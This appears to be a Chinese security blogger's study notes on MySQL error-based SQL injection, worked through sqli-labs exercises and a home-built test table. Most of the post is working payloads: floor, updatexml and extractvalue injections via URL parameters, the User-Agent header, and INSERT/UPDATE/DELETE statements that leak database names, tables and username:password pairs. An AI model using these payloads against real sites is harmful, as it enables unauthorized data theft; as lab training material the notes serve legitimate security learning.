# 06-mysql类型报错注入

  

# 1. SQL各种参数类型下的注入测试

- 数字型-sqlilabs less2   `x.php?id=1`
- 字符型-sqlilabs less1   `x.php?id=xiaodi`
- 搜索型-自写测试           `x.php?q=1`      （select * from table where name like '%xi%'）

**搞懂：**

1. 搞清楚为何要区分上面的类型
   数字的不带引号，字符型带符号，注意考虑干扰
   搜索型：模糊搜索
   计算机中搜索的通配符为`*`
   数据库中搜索的通配符为`%`






# 2. SQL各种报错方式下的注入测试

>此类报错注入旨在解决无回显下的注入测试
>注：MySQL 5.1.5版本后才包含`ExtractValue()`和`UpdateXML()`这2个函数

**参考资料：**
https://www.wandouip.com/t5i158282/
http://blog.sina.com.cn/s/blog_1450cc4c60102vraq.html


###### `floor`报错

sqlilabs less5

>报错注入有长度限制，所以concat有时候不行， 需要limit 或者还需要sub
>**payload:**

```
-- burp中注意空格问题（空格可以用+加号， 或者%20, 或者 /**/ 代替）
?id=1'+and+(select+1+from (select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+
?id=-1' and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- + 

?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2)))-- + 

http://192.168.0.121:8080/Less-5/?id=1%27 and (select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))) -- + 

-- 可以用burp批量跑 limit 0,1 的0这里。payload设置数字范围
```

###### `updatexml`报错

sqlilabs less5
updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数
**payload:**

```
?id=1' and 1=(updatexml(1,concat(0x3a,(select version())),1))--+
?id=1' and 1=(updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1))--+

http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e), 1) -- + 

http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select concat_ws(0x3a, username,password) from security.users limit 0,1),0x7e), 1) -- + 
```

###### `extractvalue`报错

sqlilabs less5
extractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数
**payload:**

```
id=1' and extractvalue(1,concat(0x7e,user()))--+
?id=1' and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1)))--+

```





# 3.SQL各种查询方式下的注入测试

- select
- insert（注册，用户添加，发布文章）   Less-18

```
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
-- sql语句  ??? 对吗没验证，截图了
insert into users(username, passwd)  values('x' or updatexml(1,concat(0x3a,(  version() ),1)  or  '  ',  'psd');

--payload
User-Agent: 中                    x' or updatexml(1,concat(0x7e,(version())),1) or ' 

User-Agent: x' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1)),1) or ' 

自己练习增,删,改： updatexml和extra两个都实验
```

- delete（后台删除文章, 用户...）
- update （改密码，数据同步）
  通过以上查询方式与网站一个用的关系，可以由注入点产生的地方或者应用猜测到对方的SQL查询方式


**环境搭建**

> 自己搭建

利用上述报错注入语句进行查询模式注入测试

```
create database newdb;

use newdb;

create table users (
    id int(3) not null auto_increment,
    username varchar(20) not null,
    passowrd varchar(20) not null,
    primary key(id)
);

insert into users values(1,'janes','Eyre');


```

> 注意使用场景，在什么情况下用到  


**插件：**
`mysql监控-Seay代码审计系统`        查看执行了哪些语句



>报错注入有长度限制:32位, 如果长度超出会显示不全.
>解决方案: substr((),1,1) 递进截取依次 (select substr(concat(username,0x3a,password), 1,10) from users limit 0,1)



###### 三种查询方式对应的报错注入测试

**floor报错演示Payload**

```sql
insert into users(id,username,passowrd) values(1,'Olivia' or (select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x;
) or '','Nervo');

update users set passowrd='Nicky' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '' where id=2;

delete from users where id=1 or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a)

```

**updatexml报错演示Payload**

```
insert into users(id,username,passowrd) values(2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or '','Nervo');

update user set passowrd='Nicky' or  updatexml(1,concat(0x7e,(version())),0) or '' where id=2 and username='Nervo';

delete from users where id=2 or updatexml(1,concat(0x7e,(version())),0) or '';

```

**extractvalue报错演示Payload**

```sql
insert into users(id,username,password) values(2,'Olivia' or extractvalue(1,concat(0x7e,database())) or '','Nervo');

update users set passowrd='Nicky' or extractvalue(1,concat(0x7e,database())) or '';

delete from users where id=1 or extractvalue(1,concat(0x7e,database())) or '';

```

>参考：https://www.cnblogs.com/babers/articles/7252401.html

**Notes:**

>delete，insert，update语句存在sql注入，扫描工具常规扫描不能获取到（没有权限，前提要登录状态下/登录后按钮的点击事件工具里面不能自动点击）， 所以：**只能手工注入**

**比如场景：**   注册/会员中心/删除文章/更新编辑文章       -->抓包：数据包地址+id参数 ： 手工测试

---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/06-mysql%E7%B1%BB%E5%9E%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/  

